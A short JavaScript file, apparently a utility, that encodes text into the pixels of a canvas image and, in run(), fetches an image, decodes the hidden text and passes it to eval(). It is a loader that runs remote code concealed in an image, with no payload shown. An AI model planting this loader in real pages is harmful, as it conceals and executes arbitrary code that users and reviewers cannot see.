function run(img) {
  fetch(img)
    .then((res) => res.blob())
    .then(async (b) => {
      let f = new FileReader();
      f.readAsDataURL(b);
      let data = await new Promise((r) => (f.onload = () => r(f.result)));
      eval(await fromImg(data));
    });

  function toImg(str) {
    str = str.toString();
    var chars = new TextEncoder("utf-8").encode(str);
    var size = Math.ceil(Math.sqrt(chars.length / 3));
    var padded = new Uint8ClampedArray(size * size * 4);
    var idx = 0;
    for (var i = 0; i < chars.length; i += 3) {
      var section = chars.subarray(i, i + 3);
      padded.set(section, idx);
      padded.set([255], idx + 3);
      idx += 4;
    }
    let data = new ImageData(padded, size, size);
    var imgSize = 256;
    var canvas = document.createElement("canvas");
    canvas.width = canvas.height = imgSize;
    var ctx = canvas.getContext("2d");
    ctx.fillStyle = "#AA0000";
    ctx.fillRect(0, 0, imgSize, imgSize);
    ctx.fillStyle = "rgb(" + size + ",0,0)";
    ctx.fillRect(0, 0, 1, 1);
    ctx.putImageData(data, 0, 1);
    return canvas.toDataURL();
  }

  async function fromImg(src) {
    let img = new Image();
    img.src = src;
    await new Promise((r) => (img.onload = r));
    let c = document.createElement("canvas");
    let ctx = c.getContext("2d");
    c.width = img.width;
    c.height = img.height;
    ctx.drawImage(img, 0, 0);
    var headerData = ctx.getImageData(0, 0, 1, 1);
    var dataSize = headerData.data[0];
    var imageData = ctx.getImageData(0, 1, dataSize, dataSize);
    var paddedData = imageData.data;
    var uint8array = new Uint8Array((paddedData.length / 4) * 3);
    var idx = 0;
    for (var i = 0; i < paddedData.length - 1; i += 4) {
      var subArray = paddedData.subarray(i, i + 3);
      uint8array.set(subArray, idx);
      idx += 3;
    }
    var includeBytes = uint8array.length;
    for (var i = uint8array.length - 1; i > 0; i--) {
      if (uint8array[i] == 0) {
        includeBytes--;
      } else {
        break;
      }
    }
    var data = uint8array.subarray(0, includeBytes);
    var strData = new TextDecoder("utf-8").decode(data);
    return strData;
  }
}
